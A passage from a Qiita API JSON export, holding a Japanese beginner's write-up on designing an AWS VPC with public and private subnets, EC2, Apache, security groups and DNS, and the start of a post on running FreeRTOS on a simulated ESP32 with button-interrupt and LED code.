data-sourcepos=\"142:2-142:5\">HTTP</td>\n<td style=\"text-align: center\" data-sourcepos=\"142:7-142:8\">80</td>\n<td style=\"text-align: center\" data-sourcepos=\"142:10-142:63\">Apahe(httpd)がブラウザからアクセスされる</td>\n</tr>\n<tr data-sourcepos=\"143:1-143:48\">\n<td style=\"text-align: center\" data-sourcepos=\"143:2-143:6\">HTTPS</td>\n<td style=\"text-align: center\" data-sourcepos=\"143:8-143:10\">443</td>\n<td style=\"text-align: center\" data-sourcepos=\"143:12-143:47\">暗号化されたウェブ通信用</td>\n</tr>\n</tbody>\n</table>\n<p data-sourcepos=\"146:1-146:55\"><a href=\"http://%E3%83%91%E3%83%96%E3%83%AA%E3%83%83%E3%82%AFIP\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://パブリックIP</a> でアクセス可能になる</p>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F5d4ce006-c613-4c3d-9e62-f320d054b9e8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=76982b5379747d1c1a0e70bda9ac08eb\" target=\"_blank\" rel=\"nofollow noopener\"><img width=\"400\" src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F5d4ce006-c613-4c3d-9e62-f320d054b9e8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=76982b5379747d1c1a0e70bda9ac08eb\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2F5d4ce006-c613-4c3d-9e62-f320d054b9e8.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=2880e89b08c3e5943fdccca4e9a3eeee 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/5d4ce006-c613-4c3d-9e62-f320d054b9e8.png\" loading=\"lazy\"></a>\n<h2 data-sourcepos=\"151:1-151:15\">\n<span id=\"ドメイン\" class=\"fragment\"></span><a href=\"#%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3\"><i class=\"fa fa-link\"></i></a>ドメイン</h2>\n<p data-sourcepos=\"153:1-154:116\">ドメイン名はDNSサーバーによってIPアドレスに変換され、接続される<br>\nWebサイトにアクセスする際、ドメイン名は裏でIPアドレスに変換されて通信が行われる</p>\n<h2 data-sourcepos=\"156:1-156:30\">\n<span id=\"データベースの構築\" class=\"fragment\"></span><a href=\"#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E6%A7%8B%E7%AF%89\"><i class=\"fa fa-link\"></i></a>データベースの構築</h2>\n<p data-sourcepos=\"157:1-157:186\">インターネットから直接アクセスできないように構成されたサブネットにサーバーを配置することで、プライベートサブネットを構築する</p>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2Fe1ffa5a9-98cb-4dd6-a940-e05d6b5b5ff6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5fe963d04497ccecac869b2f87b18c0d\" target=\"_blank\" rel=\"nofollow noopener\"><img width=\"600\" src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2Fe1ffa5a9-98cb-4dd6-a940-e05d6b5b5ff6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5fe963d04497ccecac869b2f87b18c0d\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4052007%2Fe1ffa5a9-98cb-4dd6-a940-e05d6b5b5ff6.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=9c34f4512330c69f210937df39305e11 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/e1ffa5a9-98cb-4dd6-a940-e05d6b5b5ff6.png\" loading=\"lazy\"></a>\n<h2 data-sourcepos=\"161:1-161:42\">\n<span id=\"セキュリティグループの設定\" class=\"fragment\"></span><a href=\"#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AE%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>セキュリティグループの設定</h2>\n<ul data-sourcepos=\"162:1-167:0\">\n<li data-sourcepos=\"162:1-162:82\">ポート80（HTTP）と443（HTTPS）を開放（外部アクセス用）する</li>\n<li data-sourcepos=\"163:1-163:74\">ポート220（SSH）を開放（管理用、必要に応じて）する</li>\n<li data-sourcepos=\"164:1-164:141\">独自ドメインを使いたい場合は、Route 53などのDNSサービスでドメインを取得し、パブリックIPに紐づける</li>\n<li data-sourcepos=\"165:1-167:0\">DNSレコード（Aレコード）を設定して、<a href=\"http://domein.com\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://domein.com</a> でアクセス可能にする</li>\n</ul>\n<h1 data-sourcepos=\"168:1-168:11\">\n<span id=\"まとめ\" class=\"fragment\"></span><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>まとめ</h1>\n<p data-sourcepos=\"169:1-171:240\">HTTPで独自ドメインを使った安全なWebサイトを公開できました。<br>\n今回はAWSの操作よりも、各機能がどう連携しているかに焦点を当てました。<br>\nパブリックサブネットは外部公開用、プライベートサブネットは内部リソース用と役割を分けることで、セキュリティと効率を両立している仕組みを理解することができました。</p>\n<p data-sourcepos=\"173:1-174:165\">また、今回パブリックサブネット1つに対して、プライベートサブネット2つ設置する理由については、<br>\n異なるアベイラビリティゾーン(AZ)に配置して、片方のAZが障害になってももう一方で稼働を継続できる運用にしています。</p>\n<p data-sourcepos=\"177:1-178:63\"><strong>参考資料</strong><br>\n<a href=\"http://domein.com\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">http://domein.com</a> でアクセスが可能になりました。</p>\n<p data-sourcepos=\"180:1-180:294\"><iframe id=\"qiita-embed-content__7b61d0758aa0121e76a7530fe88e34d2\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7b61d0758aa0121e76a7530fe88e34d2\" data-content=\"https%3A%2F%2Fwww.amazon.co.jp%2FAmazon-Web-Services%25E5%259F%25BA%25E7%25A4%258E%25E3%2581%258B%25E3%2582%2589%25E3%2581%25AE%25E3%2583%258D%25E3%2583%2583%25E3%2583%2588%25E3%2583%25AF%25E3%2583%25BC%25E3%2582%25AF%25EF%25BC%2586%25E3%2582%25B5%25E3%2583%25BC%25E3%2583%2590%25E3%2583%25BC%25E6%25A7%258B%25E7%25AF%2589%25E6%2594%25B9%25E8%25A8%2582%25EF%25BC%2594%25E7%2589%2588-%25E5%25A4%25A7%25E6%25BE%25A4-%25E6%2596%2587%25E5%25AD%259D%2Fdp%2F4296202049\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"182:1-182:76\"><iframe id=\"qiita-embed-content__7d0618c58082d69c4fd1d968effdd6e6\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7d0618c58082d69c4fd1d968effdd6e6\" data-content=\"https%3A%2F%2Fqiita.com%2FNana_777%2Fitems%2F4fc0e8e24a65d1c80e20%3Futm_source%3Dchatgpt.com\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"184:1-184:72\"><iframe id=\"qiita-embed-content__90597bf877034c0822c4d9621e6f70cb\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__90597bf877034c0822c4d9621e6f70cb\" data-content=\"https%3A%2F%2Fzenn.dev%2Fnenenemo%2Farticles%2F17898e5b1150c0%3Futm_source%3Dchatgpt.com\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n",
      "body": "# インフラを知っていることでアプリのシステム全体が見える\nオリジナルプロダクトの開発を進めるうえで、アプリはインフラ基盤の上で動作します。\n今回はサービス全体の仕組みを理解する目的でインフラ構築にも取り組みました。\nできるだけ図を使って整理し、各要素のつながりが分かりやすくなるように工夫しています。\n\n## 公開されたネットワークと隠されたネットワーク\n### パブリックサブネット　\n**公開されたネットワーク**とは、ユーザーから直接アクセス可能なネットワークのこと\n　例）https://example.com へのアクセス\n \n### プライベートサブネット\n**隠されたネットワーク**とは、外部から直接アクセスできないネットワークのこと\nプライベートな空間となるためデータベースを設置している\n\n|ネットワーク|説明|具体例|\n|:--:|:--:|:--:|\n|Webサーバー|Webサイトを提供する|開発したアプリ、Apache、OS|\n|データベースサーバー|データを保存する|MySQL、OS|\n\n**TCP/IP**\n構築したサーバーはネットワークにつなげて通信するため、それぞれのサーバーにIPアドレスという番号を振る必要がある\nまたドメイン名でアクセスする＝DNSサーバーの設定も必要となる\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/3e763ee9-a120-422e-8456-bfa46c28bd3f.png)\n\n**ネットワークを構成するときの基本的な仕組み**\n①DNSサーバーにドメイン名とIPアドレスの対応を割り当てる\n②IPアドレスを割り当て、データがルーターから出ていくように構成する\n③ネットワークで使うIPアドレス範囲を定める\n\n　※NATゲートウェイ：方方向だけの通信を許す\n　　DBからインターネットサーバーに接続は可能\n\n\n**サブネット**\nVPC仮想的なネットワークの領域\nそのようなIPアドレス範囲を扱うかを指定する\n\nEC２でサーバーを作る\n起動した各サーバーの個体は「インスタンス」という\n\n**IPアドレス**\n「0.0.0.0」～「255.255.255.255」まで\nICANNという団体が一括管理している\n\n\n**パブリックIPアドレス**\nインターネットに接続する際使用されるIPアドレス\n\n**プライベートIPアドレス**\n社内LANやネットワークの実験時に使用されるIPアドレス\n\n\n## ネットワークを構築する\nまずは簡単にAWSでネットワークを構築しました。\n\n### 1.VPCを作成する\nリージョンを選択する\n例）AWSで一番使われている主要リージョンの1つ「オレゴン」\n例）東京など\n\n\n### 2. VPCをサブネットに分割する\nパブックサブネットとプライベートサブネットを作成する\n\n### 3.インターネット回線を引き込む\nインターネットゲートウェイを作成、VPCにアタッチする\n\n### 4.ルートテーブルを作成する\nVPCと接続し、パブリックサブネットと関連付ける\n「0.0.0.0/0」とインターネットゲートウェイを選択し、インターネット接続を有効化する\n<img width=\"400\" src = \"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/24bba7ab-b0a3-4361-8cf7-bbf3a3b65de2.png\">\n\n\n## サーバーを構築する\n\n### インスタンスの作成\n- Amazon Linux 2023(OS)を選択し、キーペア(EC2に接続するための鍵ファイル)を作成する\n- パブリックIPアドレスを付与して、外部ネットワーク（自宅・職場）から EC2 に SSH 接続できるようにする\n- SSHを使って遠隔からのログインで必要な設定をする\nセキュリティグループ(EC2のファイアウォール)を作成する\n\n## SSHで接続する\n### RLoginでパブリックIPアドレスにSSHで接続する\nインスタンスのパブリック IPv4 アドレスが接続先となる\n\n\n### Elastic IPを確保する\n起動・停止を繰り返したいので、設定しました\n別のIPアドレを割り当てられてしまうため、固定したいときはおすすめです\n\n\n**ポート番号の考え方**\n\nファイヤウォールで接続制限となり、通してよいデータだけを通す\n　→ファイヤーウォールを設けることが効果的\n\nセキュリティグループのインバウンドルールをクリック、インバウンドルールでポート22(SSH)だけ通信できる\n\n\n|ポート番号|サービス|\n|:--:|:--:|\n|:80|HTTP|\n|:443| HTTPS| \n|:22|SSH|   \n|:3306| MySQL| \n\n**IPアドレスは同じサービスを区別する**\n同じサーバー内で HTTP と HTTPS が混ざらないようにしている\n\n**ファイアウォールやセキュリティグループ設定で必要**\n\nAWS では\n「443 を開ける」→ HTTPS が通る\n「80 を閉じる」→ HTTP アクセスを止める\nとなり、「どのサービスを公開するか」＝「どのポートを開けるか」で制御できる\n\n**ダイレクトの設定で必須になる**\nHTTP → HTTPS にリダイレクトする場合\n\n1. ユーザーが http://（→ポート 80）へアクセス\n2. Web サーバーが受け取る（80 番）\n3. https://（→443 番）へ 301 リダイレクト\n\n→ このため、HTTPS を強制したい場合でも 80 番ポートは開けておく必要がある\n\n**ロードバランサ―もポート番号を見て振り分ける**\nAWS ALB（アプリケーションロードバランサー）\n- リスナー 80 → 自動で443 へリダイレクト\n- リスナー 443 → バックエンドEC2へ転送\n\n\n\n<img width=\"400\" src = \"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/5e8e2ec7-4a01-47ac-86fb-846177573050.png\">\n\nhttps://docs.aws.amazon.com/ja_jp/AWSEC2/latest/UserGuide/ec2-security-groups.html\n\n## Apache HTTP Serverのインストール\n|サービス|デォルトポート番号|説明|\n|:--:|:--:|:--:|\n|SSH|220|モート接続・サーバ管理用|\n|HTTP|80|Apahe(httpd)がブラウザからアクセスされる|\n|HTTPS|443|暗号化されたウェブ通信用|\n\n\nhttp://パブリックIP でアクセス可能になる\n\n<img width=\"400\" src = \"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/5d4ce006-c613-4c3d-9e62-f320d054b9e8.png\">\n\n\n## ドメイン\n\nドメイン名はDNSサーバーによってIPアドレスに変換され、接続される\nWebサイトにアクセスする際、ドメイン名は裏でIPアドレスに変換されて通信が行われる\n\n## データベースの構築\nインターネットから直接アクセスできないように構成されたサブネットにサーバーを配置することで、プライベートサブネットを構築する\n\n<img width=\"600\" src = \"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4052007/e1ffa5a9-98cb-4dd6-a940-e05d6b5b5ff6.png\">\n\n## セキュリティグループの設定\n- ポート80（HTTP）と443（HTTPS）を開放（外部アクセス用）する\n- ポート220（SSH）を開放（管理用、必要に応じて）する\n- 独自ドメインを使いたい場合は、Route 53などのDNSサービスでドメインを取得し、パブリックIPに紐づける\n- DNSレコード（Aレコード）を設定して、http://domein.com でアクセス可能にする\n\n\n# まとめ\nHTTPで独自ドメインを使った安全なWebサイトを公開できました。\n今回はAWSの操作よりも、各機能がどう連携しているかに焦点を当てました。\nパブリックサブネットは外部公開用、プライベートサブネットは内部リソース用と役割を分けることで、セキュリティと効率を両立している仕組みを理解することができました。\n\nまた、今回パブリックサブネット1つに対して、プライベートサブネット2つ設置する理由については、\n異なるアベイラビリティゾーン(AZ)に配置して、片方のAZが障害になってももう一方で稼働を継続できる運用にしています。\n\n\n**参考資料**\nhttp://domein.com でアクセスが可能になりました。\n\nhttps://www.amazon.co.jp/Amazon-Web-Services%E5%9F%BA%E7%A4%8E%E3%81%8B%E3%82%89%E3%81%AE%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%EF%BC%86%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E6%A7%8B%E7%AF%89%E6%94%B9%E8%A8%82%EF%BC%94%E7%89%88-%E5%A4%A7%E6%BE%A4-%E6%96%87%E5%AD%9D/dp/4296202049\n\nhttps://qiita.com/Nana_777/items/4fc0e8e24a65d1c80e20?utm_source=chatgpt.com\n\nhttps://zenn.dev/nenenemo/articles/17898e5b1150c0?utm_source=chatgpt.com\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:36:41+09:00",
      "group": null,
      "id": "82dd54dccff7437479a2",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "AWS",
          "versions": []
        },
        {
          "name": "EC2",
          "versions": []
        },
        {
          "name": "VPN",
          "versions": []
        },
        {
          "name": "ドメイン",
          "versions": []
        },
        {
          "name": "IPアドレス",
          "versions": []
        }
      ],
      "title": "AWS環境の構築を、機能の連携を意識して設計してみた",
      "updated_at": "2025-12-09T14:38:14+09:00",
      "url": "https://qiita.com/yuzu14s/items/82dd54dccff7437479a2",
      "user": {
        "description": "未経験エンジニア志望です。",
        "facebook_id": "",
        "followees_count": 9,
        "followers_count": 0,
        "github_login_name": null,
        "id": "yuzu14s",
        "items_count": 13,
        "linkedin_id": "",
        "location": "",
        "name": "yuzuha",
        "organization": "",
        "permanent_id": 4052007,
        "profile_image_url": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/4052007/de2359d06d13900ba1ca5b47b253eb2f8c3b2884/x_large.png?1744981743",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": "https://note.com/yuzupipi14/n/n878907346da9"
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<p data-sourcepos=\"1:1-1:122\">VSCodeでWokwi,PlatformIOを使用し、シミュレータのみで実機も無しにESP32でのRT-OSを動作させた。</p>\n<p data-sourcepos=\"3:1-3:23\">Arduino IDEと同じ。</p>\n<p data-sourcepos=\"5:1-6:29\">動作させたマシンはManjaro Linux<br>\n関係ないけど、WMは i3</p>\n<p data-sourcepos=\"9:1-9:127\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3937994%2Fa72f6c81-2eed-4409-ae49-f1bace54a841.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f4f767113a86a27133c8f33fc649e0e4\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3937994%2Fa72f6c81-2eed-4409-ae49-f1bace54a841.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f4f767113a86a27133c8f33fc649e0e4\" alt=\"1765257964.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3937994%2Fa72f6c81-2eed-4409-ae49-f1bace54a841.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3c5ae702e50f5d7950c53b4b4703b7a1 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3937994/a72f6c81-2eed-4409-ae49-f1bace54a841.png\" loading=\"lazy\"></a></p>\n<div class=\"code-frame\" data-lang=\"c++\" data-sourcepos=\"12:1-120:3\">\n<div class=\"code-lang\"><span class=\"bold\">_1strtos_9C25.cpp</span></div>\n<div class=\"highlight\"><pre><code><span class=\"cp\">#include</span> <span class=\"cpf\">&lt;Arduino.h&gt;</span><span class=\"cp\">\n</span>\n<span class=\"c1\">// vvv ArduinoIDEでは↓は記述する必要は無いが明示的に書いておく</span>\n<span class=\"cp\">#include</span> <span class=\"cpf\">&lt;freertos/FreeRTOS.h&gt;</span><span class=\"cp\">\n#include</span> <span class=\"cpf\">&lt;freertos/task.h&gt;</span><span class=\"cp\">\n#include</span> <span class=\"cpf\">&lt;freertos/queue.h&gt;</span><span class=\"cp\">\n</span>\n<span class=\"k\">const</span> <span class=\"kt\">int</span> <span class=\"n\">BUTTON_PIN</span> <span class=\"o\">=</span> <span class=\"mi\">4</span><span class=\"p\">;</span> <span class=\"c1\">// ボタン/入力に使用するピン (GPIO4)ニャ</span>\n<span class=\"k\">const</span> <span class=\"kt\">int</span> <span class=\"n\">LED_PIN</span> <span class=\"o\">=</span> <span class=\"mi\">2</span><span class=\"p\">;</span>    <span class=\"c1\">// LED/出力に使用するピン (GPIO2)ニャ</span>\n\n<span class=\"n\">TaskHandle_t</span>    <span class=\"n\">sw_tskh</span> <span class=\"p\">;</span>\n<span class=\"n\">TaskHandle_t</span>    <span class=\"n\">led_tskh</span> <span class=\"p\">;</span>\n<span class=\"n\">QueueHandle_t</span> <span class=\"n\">sw_q</span> <span class=\"p\">;</span>\n\n<span class=\"c1\">// ↓Arduino IDEだが、ESP32ではプロトタイプ宣言がないとcompile errorになった</span>\n<span class=\"kt\">void</span> <span class=\"nf\">led_taskf</span><span class=\"p\">(</span><span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">parameter</span><span class=\"p\">);</span>\n<span class=\"kt\">void</span> <span class=\"nf\">warikomi_go</span><span class=\"p\">();</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">setup</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n  <span class=\"n\">pinMode</span><span class=\"p\">(</span><span class=\"n\">LED_PIN</span><span class=\"p\">,</span> <span class=\"n\">OUTPUT</span><span class=\"p\">);</span>\n  <span class=\"n\">pinMode</span><span class=\"p\">(</span><span class=\"n\">BUTTON_PIN</span><span class=\"p\">,</span> <span class=\"n\">INPUT</span><span class=\"p\">);</span>\n\n  <span class=\"n\">xTaskCreate</span><span class=\"p\">(</span>\n    <span class=\"n\">led_taskf</span> <span class=\"p\">,</span> <span class=\"c1\">//function</span>\n    <span class=\"s\">\"tact sw input task\"</span><span class=\"p\">,</span> \n    <span class=\"mi\">1024</span> <span class=\"p\">,</span> \n    <span class=\"nb\">NULL</span><span class=\"p\">,</span> <span class=\"c1\">// parameter</span>\n    <span class=\"mi\">12</span><span class=\"p\">,</span> \n    <span class=\"o\">&amp;</span><span class=\"n\">led_tskh</span>\n  <span class=\"p\">);</span>\n \n  <span class=\"n\">sw_q</span> <span class=\"o\">=</span> <span class=\"n\">xQueueCreate</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">byte</span><span class=\"p\">));</span>\n\n  <span class=\"n\">warikomi_go</span><span class=\"p\">()</span> <span class=\"p\">;</span>\n  <span class=\"n\">Serial</span><span class=\"p\">.</span><span class=\"n\">begin</span><span class=\"p\">(</span><span class=\"mi\">115200</span><span class=\"p\">);</span> <span class=\"c1\">// シリアル通信を開始し、ボーレートを設定</span>\n  <span class=\"n\">Serial</span><span class=\"p\">.</span><span class=\"n\">println</span><span class=\"p\">(</span><span class=\"s\">\"Hello, World! from ESP32 WROVER\"</span><span class=\"p\">);</span> <span class=\"c1\">// 文字列をシリアルポートに出力</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">const</span> <span class=\"n\">byte</span> <span class=\"n\">nandemo_ok</span> <span class=\"o\">=</span> <span class=\"mi\">0</span> <span class=\"p\">;</span> <span class=\"c1\">//代入しないとCRASHする</span>\n\n<span class=\"c1\">//kes uint32_t lcome = 0 ;</span>\n<span class=\"kt\">void</span> <span class=\"n\">IRAM_ATTR</span> <span class=\"nf\">sw_warikomif</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"c1\">//  if( millis() &lt; lcome )return ;</span>\n<span class=\"c1\">//  lcome = millis() + 100 ;</span>\n\n  <span class=\"n\">BaseType_t</span> <span class=\"n\">changeTask_to_sentQ_ifUcan</span> <span class=\"o\">=</span> <span class=\"n\">pdFALSE</span><span class=\"p\">;</span> <span class=\"c1\">// 初期値を代入しないとCRASHする</span>\n  <span class=\"n\">detachInterrupt</span><span class=\"p\">(</span><span class=\"n\">digitalPinToInterrupt</span><span class=\"p\">(</span><span class=\"n\">BUTTON_PIN</span><span class=\"p\">));</span><span class=\"c1\">//一旦 割り込み禁止</span>\n <span class=\"c1\">//割り込みからこれは使用できない --&gt; xQueueSend(led_taskh, nandemo_ok, 0) ;//queueがfullでも何もしない</span>\n <span class=\"c1\">// ^^^ 0 queueがfullの時、1回だけその時間待機する。0ならすぐ帰る</span>\n\n  <span class=\"n\">xQueueSendFromISR</span><span class=\"p\">(</span><span class=\"n\">sw_q</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">nandemo_ok</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">changeTask_to_sentQ_ifUcan</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">warikomi_go</span><span class=\"p\">()</span>\n<span class=\"p\">{</span> <span class=\"c1\">//  割り込みON</span>\n  <span class=\"n\">attachInterrupt</span><span class=\"p\">(</span><span class=\"n\">digitalPinToInterrupt</span><span class=\"p\">(</span><span class=\"n\">BUTTON_PIN</span><span class=\"p\">),</span> <span class=\"n\">sw_warikomif</span><span class=\"p\">,</span> <span class=\"n\">FALLING</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"n\">couter</span> <span class=\"p\">;</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">led_taskf</span><span class=\"p\">(</span><span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">parameter</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"n\">byte</span> <span class=\"n\">leds</span> <span class=\"o\">=</span> <span class=\"mi\">1</span> <span class=\"p\">,</span><span class=\"n\">ledb</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">byte</span> <span class=\"n\">qrcv</span> <span class=\"p\">;</span>\n  <span class=\"n\">byte</span> <span class=\"n\">hc</span> <span class=\"o\">=</span> <span class=\"mi\">0</span> <span class=\"p\">;</span>\n  <span class=\"k\">while</span><span class=\"p\">(</span> <span class=\"nb\">true</span> <span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"c1\">//    vTaskDelay(pdMS_TO_TICKS(1000));</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">xQueueReceive</span><span class=\"p\">(</span><span class=\"n\">sw_q</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">qrcv</span><span class=\"p\">,</span> <span class=\"mi\">222</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"n\">pdPASS</span><span class=\"p\">)</span> \n    <span class=\"p\">{</span>\n      <span class=\"n\">leds</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"o\">-</span><span class=\"n\">leds</span> <span class=\"p\">;</span>\n      <span class=\"n\">Serial</span><span class=\"p\">.</span><span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Switch led mode %d %d</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span><span class=\"n\">leds</span><span class=\"p\">,</span><span class=\"n\">couter</span><span class=\"o\">++</span><span class=\"p\">);</span>\n      <span class=\"n\">ledb</span> <span class=\"o\">=</span> <span class=\"mi\">1</span> <span class=\"p\">;</span>\n      <span class=\"n\">hc</span> <span class=\"o\">=</span> <span class=\"mi\">3</span> <span class=\"p\">;</span> <span class=\"c1\">// 222msec x 3</span>\n    <span class=\"p\">}</span><span class=\"k\">else</span><span class=\"p\">{</span>\n      <span class=\"n\">ledb</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"o\">-</span><span class=\"n\">ledb</span> <span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n      <span class=\"c1\">// 受信成功ニャ</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span> <span class=\"o\">!</span><span class=\"n\">leds</span> <span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">ledb</span> <span class=\"o\">=</span> <span class=\"mi\">0</span> <span class=\"p\">;</span> <span class=\"c1\">//消灯</span>\n    <span class=\"p\">}</span>\n    \n    <span class=\"k\">while</span><span class=\"p\">(</span> <span class=\"n\">hc</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">digitalRead</span><span class=\"p\">(</span><span class=\"n\">BUTTON_PIN</span><span class=\"p\">)</span> <span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">hc</span> <span class=\"o\">--</span> <span class=\"p\">;</span>\n      <span class=\"k\">if</span><span class=\"p\">(</span> <span class=\"n\">hc</span> <span class=\"p\">)</span><span class=\"k\">break</span> <span class=\"p\">;</span>\n      <span class=\"n\">warikomi_go</span><span class=\"p\">()</span> <span class=\"p\">;</span> <span class=\"c1\">//割り込み ON</span>\n      <span class=\"k\">break</span> <span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"n\">digitalWrite</span><span class=\"p\">(</span><span class=\"n\">LED_PIN</span> <span class=\"p\">,</span> <span class=\"n\">ledb</span> <span class=\"p\">);</span>\n  <span class=\"p\">}</span><span class=\"c1\">//...while - true </span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">loop</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"n\">delay</span><span class=\"p\">(</span><span class=\"mi\">100</span><span class=\"p\">);</span>\n  <span class=\"n\">vTaskDelete</span><span class=\"p\">(</span><span class=\"nb\">NULL</span><span class=\"p\">);</span> <span class=\"c1\">// 自身をKILL</span>\n<span class=\"p\">}</span>\n\n<span class=\"cm\">/*\nLED1赤GPIO2\nLED2緑GPIO15\nスイッチ1青GPIO4\nスイッチ2赤GPIO5\n*/</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"122:1-122:12\">接続は↓</p>\n<div class=\"code-frame\" data-lang=\"json\" data-sourcepos=\"123:1-236:3\">\n<div class=\"code-lang\"><span class=\"bold\">diagram.json</span></div>\n<div class=\"highlight\"><pre><code><span class=\"p\">{</span><span class=\"w\">\n  </span><span class=\"nl\">\"version\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">1</span><span class=\"p\">,</span><span 